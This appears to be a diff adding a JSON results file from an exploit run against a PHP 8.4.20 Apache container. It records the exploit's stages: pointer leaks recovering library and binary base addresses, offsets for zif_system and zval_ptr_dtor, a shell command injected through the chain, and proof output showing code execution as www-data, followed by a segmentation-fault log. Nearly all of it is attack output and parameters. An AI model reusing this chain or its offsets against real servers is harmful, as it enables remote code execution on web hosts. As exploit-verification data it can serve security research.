@@ -1,0 +1,267 @@
+{
+ "version": "8.4.20",
+ "image": "php:8.4.20-apache",
+ "port": 19320,
+ "image_id": "sha256:2150d79ea760c38d3b030ba8d4b797af5360747a6225d894e5ffa048819a336e",
+ "so_sha256": "9324d527478896a08f0eeb0c0c9db1b6a7a716ac5af912fbbc17722224a893b8",
+ "so_bytes": 20990528,
+ "symbols": {
+  "zval_ptr_dtor": "0x63f9e0",
+  "zif_system": "0x447530"
+ },
+ "php": [
+  "PHP 8.4.20 (cli) (built: Apr 22 2026 01:26:43) (NTS)"
+ ],
+ "apache": "Server version: Apache/2.4.66 (Debian)\nServer built:   2026-03-01T13:26:45",
+ "ini_sha256": "8d6fcbbcff186958a3609e277f8db249122a89d01e8401b1861f5bd4283f148a",
+ "ini_md5": "fba97f0b3e0b19b0980f5102c0440480",
+ "effective_ini": "display_errors=\nmemory_limit=128M\npost_max_size=8M\nupload_max_filesize=2M\nmax_execution_time=30\nsession.upload_progress.enabled=1\noutput_buffering=4096\nzend.assertions=-1\nversion=8.4.20",
+ "a1_probe": {
+  "status": "HTTP/1.0 500 Internal Server Error",
+  "bytes": 211
+ },
+ "chain": {
+  "stages": [
+   {
+    "stage": "A1",
+    "rc": 0,
+    "status": "HTTP/1.0 500 Internal Server Error",
+    "bytes": 211,
+    "elapsed": 0.11
+   },
+   {
+    "stage": "B1",
+    "i": 0,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 1,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 2,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 3,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 4,
+    "bytes": 1687539,
+    "status": "HTTP/1.1 200 OK",
+    "decoded": 819208,
+    "lib": "0x7f91a0ebd000",
+    "cands": {
+     "0x7f919f200000": 87,
+     "0x7f919ea00000": 79
+    },
+    "main": "0x7f919f200000",
+    "leak": "hit",
+    "chosen": true
+   },
+   {
+    "stage": "A2",
+    "i": 0,
+    "bytes": 211,
+    "status": "HTTP/1.0 500 Internal Server Error"
+   },
+   {
+    "stage": "B2",
+    "i": 0,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 1,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 2,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 3,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 4,
+    "bytes": 0,
+    "status": ""
+   }
+  ],
+  "success": true,
+  "marker": "M84_8420_a",
+  "zif_off": "0x447530",
+  "zdtor_off": "0x63f9e0",
+  "s_off": "0xf8398",
+  "a1": {
+   "bytes": 1060211,
+   "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+  },
+  "b1": {
+   "bytes": 33128677,
+   "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+  },
+  "S": "0x7f919f2f8398",
+  "zif_system": "0x7f91a1304530",
+  "main": "0x7f919f200000",
+  "lib": "0x7f91a0ebd000",
+  "lib_minus_main": "0x1cbd000",
+  "a2": {
+   "bytes": 279369,
+   "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+  },
+  "b2": {
+   "bytes": 451384,
+   "cmd": "id>/out/p1_conc_M84_8420_a;echo M84_8420_a>>/out/p1_conc_M84_8420_a;id>&2;echo M84_8420_a>&2",
+   "sha256": "33aa033bca324cc260d13bab9cbe4209dd649723b686b015c34789d29f167964"
+  },
+  "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nM84_8420_a\n",
+  "b2_hit": 4,
+  "_stdout_tail": "A1 {'stage': 'A1', 'rc': 0, 'status': 'HTTP/1.0 500 Internal Server Error', 'bytes': 211, 'elapsed': 0.11}\nB1 {'stage': 'B1', 'i': 0, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 1, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 2, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 3, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 4, 'bytes': 1687539, 'status': 'HTTP/1.1 200 OK', 'decoded': 819208, 'lib': '0x7f91a0ebd000', 'cands': {'0x7f919f200000': 87, '0x7f919ea00000': 79}, 'main': '0x7f919f200000', 'leak': 'hit', 'chosen': True}\nRESULT True uid=33(www-data) gid=33(www-data) groups=33(www-data) | M84_8420_a | \n"
+ },
+ "success": true,
+ "final": {
+  "stages": [
+   {
+    "stage": "A1",
+    "rc": 0,
+    "status": "HTTP/1.0 500 Internal Server Error",
+    "bytes": 211,
+    "elapsed": 0.11
+   },
+   {
+    "stage": "B1",
+    "i": 0,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 1,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 2,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 3,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK",
+    "leak": "err:no pointers"
+   },
+   {
+    "stage": "B1",
+    "i": 4,
+    "bytes": 1687539,
+    "status": "HTTP/1.1 200 OK",
+    "decoded": 819208,
+    "lib": "0x7f91a0ebd000",
+    "cands": {
+     "0x7f919f200000": 87,
+     "0x7f919ea00000": 79
+    },
+    "main": "0x7f919f200000",
+    "leak": "hit",
+    "chosen": true
+   },
+   {
+    "stage": "A2",
+    "i": 0,
+    "bytes": 211,
+    "status": "HTTP/1.0 500 Internal Server Error"
+   },
+   {
+    "stage": "B2",
+    "i": 0,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 1,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 2,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 3,
+    "bytes": 259,
+    "status": "HTTP/1.1 200 OK"
+   },
+   {
+    "stage": "B2",
+    "i": 4,
+    "bytes": 0,
+    "status": ""
+   }
+  ],
+  "success": true,
+  "marker": "M84_8420_a",
+  "zif_off": "0x447530",
+  "zdtor_off": "0x63f9e0",
+  "s_off": "0xf8398",
+  "a1": {
+   "bytes": 1060211,
+   "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+  },
+  "b1": {
+   "bytes": 33128677,
+   "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+  },
+  "S": "0x7f919f2f8398",
+  "zif_system": "0x7f91a1304530",
+  "main": "0x7f919f200000",
+  "lib": "0x7f91a0ebd000",
+  "lib_minus_main": "0x1cbd000",
+  "a2": {
+   "bytes": 279369,
+   "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+  },
+  "b2": {
+   "bytes": 451384,
+   "cmd": "id>/out/p1_conc_M84_8420_a;echo M84_8420_a>>/out/p1_conc_M84_8420_a;id>&2;echo M84_8420_a>&2",
+   "sha256": "33aa033bca324cc260d13bab9cbe4209dd649723b686b015c34789d29f167964"
+  },
+  "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nM84_8420_a\n",
+  "b2_hit": 4,
+  "_stdout_tail": "A1 {'stage': 'A1', 'rc': 0, 'status': 'HTTP/1.0 500 Internal Server Error', 'bytes': 211, 'elapsed': 0.11}\nB1 {'stage': 'B1', 'i': 0, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 1, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 2, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 3, 'bytes': 259, 'status': 'HTTP/1.1 200 OK', 'leak': 'err:no pointers'}\nB1 {'stage': 'B1', 'i': 4, 'bytes': 1687539, 'status': 'HTTP/1.1 200 OK', 'decoded': 819208, 'lib': '0x7f91a0ebd000', 'cands': {'0x7f919f200000': 87, '0x7f919ea00000': 79}, 'main': '0x7f919f200000', 'leak': 'hit', 'chosen': True}\nRESULT True uid=33(www-data) gid=33(www-data) groups=33(www-data) | M84_8420_a | \n"
+ },
+ "crash_lines": [
+  "[Fri Oct 23 08:39:45.139789 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 18 exit signal Segmentation fault (11)"
+ ]
+}
